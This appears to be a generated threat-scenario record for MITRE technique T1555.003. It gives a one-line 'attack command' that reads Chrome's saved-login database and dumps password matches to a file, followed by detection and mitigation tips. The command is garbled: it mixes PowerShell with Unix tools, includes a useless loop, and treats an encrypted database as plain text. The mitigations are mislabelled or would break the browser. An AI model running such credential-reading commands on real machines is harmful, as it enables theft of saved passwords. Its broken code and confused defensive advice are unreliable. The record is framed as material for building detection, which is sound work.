---
type: campaign
scenario_id: 129
tactic: Credential Access
technique: "T1555.003: Credentials from Web Browsers"
technique_id: T1555.003
tags: [campaign, lotl, credential_access]
---

# Extracting browser credentials using PowerShell from Chrome database.

## Threat Description
Extracting browser credentials using PowerShell from Chrome database.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Content $env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data | Select-String password > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)"
```

## Detection Logic
Monitor browser data access: `wmic process where name='powershell.exe' get commandline | findstr Chrome`; Event ID 4663.

## Mitigation
Encrypt browser data: `reg add HKLM\Software\Policies\Google\Chrome /v PasswordManagerEnabled /t REG_DWORD /d 0`; Restrict file access: `icacls %localappdata%\Google\Chrome /deny Everyone:RX`.

## AI Training Prompt
Train AI to detect Chrome credential extraction and suggest browser protections.

## References
- MITRE ATT&CK T1555.003: https://attack.mitre.org/techniques/T1555/003/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
